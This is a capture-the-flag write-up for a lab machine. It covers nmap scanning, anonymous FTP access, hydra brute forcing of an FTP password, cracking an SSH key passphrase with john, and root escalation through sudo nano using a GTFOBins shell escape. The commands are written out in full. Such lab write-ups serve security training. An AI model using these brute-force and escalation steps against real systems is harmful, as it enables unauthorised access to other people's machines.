# Writeup for hackers 01 <br>

=> This machine is entairly based on Bruteforce.So comparitively with other machines it takes some time. <br>

1> nmap -sC -p- 10.10.142.184 <br>

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
9999/tcp open  abyss?
```
2> ftp has an Anonymous login.
from ftp we will get a note.

which says 
```
Note:
Any users with passwords in this list:
love
sex
god
secret
will be subject to an immediate disciplinary hearing.
Any users with other weak passwords will be complained at, loudly.
These users are:
rcampbell:Robert M. Campbell:Weak password
gcrawford:Gerard B. Crawford:Exposing crypto keys, weak password
Exposing the company's cryptographic keys is a disciplinary offense.
Eugene Belford, CSO
```
3> bruteforce the password of gcrawford ftp using hydra
```
hydra ftp://10.10.142.184 -l gcrawford -P /usr/share/wordlists/rockyou.txt -t 64
```
once you get the password login to ftp and you will find out the id_rsa key and business.txt.

4> As id_rsa key is password protected lets use ssh2john and bruteforce the hash you got
```
 python3 /usr/share/john/ssh2john.py id_rsa > ssh_hash.txt
 ```
 ```
 john ssh_hash.txt --format=ssh --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 5> once you get the password just login to the ssh connction.
 ```
 root@5h4rk:~/koth-hackers# ssh -i id_rsa gcrawford@10.10.142.184
Unauthorised access is a federal offense under the Computer Fraud and Abuse Act 1986
Enter passphrase for key 'id_rsa': 
Last login: Wed Apr 29 19:32:48 2020 from 192.168.170.1
gcrawford@gibson:~$ whoami
gcrawford
gcrawford@gibson:~$ ls
business.txt
gcrawford@gibson:~$ ls -lah
total 40K
drwxr-x--- 6 gcrawford gcrawford 4.0K Apr 30 04:25 .
drwxr-xr-x 6 root      root      4.0K Apr 29 22:05 ..
lrwxrwxrwx 1 gcrawford gcrawford    9 Apr 30 01:31 .bash_history -> /dev/null
-rw-r--r-- 1 gcrawford gcrawford  220 Apr 29 04:00 .bash_logout
-rw-r--r-- 1 gcrawford gcrawford 3.7K Apr 29 04:00 .bashrc
-r-------- 1 gcrawford gcrawford  252 Apr 30 04:25 business.txt
drwx------ 2 gcrawford gcrawford 4.0K Apr 29 17:05 .cache
drwx------ 3 gcrawford gcrawford 4.0K Apr 29 17:05 .gnupg
drwxrwxr-x 3 gcrawford gcrawford 4.0K Apr 29 20:53 .local
-rw-r--r-- 1 gcrawford gcrawford  807 Apr 29 04:00 .profile
drwx------ 2 gcrawford gcrawford 4.0K May  9 21:10 .ssh
gcrawford@gibson:~$ sudo -l
[sudo] password for gcrawford:        
Matching Defaults entries for gcrawford on gibson:
    env_reset, pwfeedback, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gcrawford may run the following commands on gibson:
    (root) /bin/nano /home/gcrawford/business.txt
  ```

6> Time to root the machine! <br>
as we can see that we can run nano as root. from gtfobins there is cheat code:- <br>
use:-<br>
```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```
finally rooted the machine!

